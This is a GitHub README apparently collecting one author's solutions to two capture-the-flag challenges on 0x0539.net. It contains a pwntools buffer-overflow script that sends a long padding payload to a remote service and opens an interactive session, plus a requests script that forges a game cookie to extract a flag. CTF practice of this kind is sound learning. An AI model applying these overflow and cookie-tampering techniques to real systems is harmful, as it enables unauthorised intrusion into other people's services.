# 0x0539
Here I will post my solutions/exploits for some of the challenges on 0x0539.net
<h1 align="center">
	<img src="https://icons.veryicon.com/png/o/emoticon/number/duo-1.png" width="150px"><br>
    0x0539 - Here I will post my solutions/exploits for some of the challenges on 0x0539.net
</h1>
<p align="center">
	This repository will contain my exploits for solving some challenges on 0x0539.net. Please don't steal my code, and claim it as your own.
</p>

<p align="center">
	<a href="https://deno.land" target="_blank">
    	<img src="https://img.shields.io/badge/Version-1.0.0-7DCDE3?style=for-the-badge" alt="Version">
     </a>
	<a href="https://deno.land" target="_blank">
    	<img src="https://img.shields.io/badge/Deno-1.0.0+-7DCDE3?style=for-the-badge" alt="Node">
     </a>
</p>

## SIGSEGV
```py
from pwn import *


# SIGSEGV
# Date: 08/21/21
# Made by 0x1CA3


class Pwn():
	def __init__(self, host, port):
		self.host = host
		self.port = port

	def exploit(self):
		payload = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		connection = remote(self.host, self.port)
		connection.sendline(payload)
		connection.interactive()

def main():
	host = "challenges.0x0539.net"
	port = 7071
	pwn = Pwn(host, port)
	pwn.exploit()

if __name__ == "__main__":
	try:
		main()
	except:
		print("[!] Error running exploit! [!]")
```

## Lucky Feeling
```py
import requests

# Lucky Feeling
# Date: 08/22/21
# Author: 0x1CA3


class Pwn():
    def __init__(self, host):
        self.host = host
    
    def exploit(self):
        s = requests.Session()
        site_cookies = {"rounds": "999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999"}
        
        a = s.get(self.host, cookies=site_cookies)
        
        for i in range(99):
            a = s.post(self.host, cookies=site_cookies, data={"guess": ""})

        print(""" 
        [+] Flag output [+]
        -------------------""")
        print(s.post(self.host, cookies=site_cookies, data={"guess": ""}).text)

def main():
    host = "http://challenges.0x0539.net:3002/"
    Pwn(host).exploit()
main()

if __name__ == "__main__":
    main()
```
## Credits
```
https://github.com/0x1CA3
```
### Contributions 🎉
###### All contributions are accepted, simply open an Issue / Pull request.
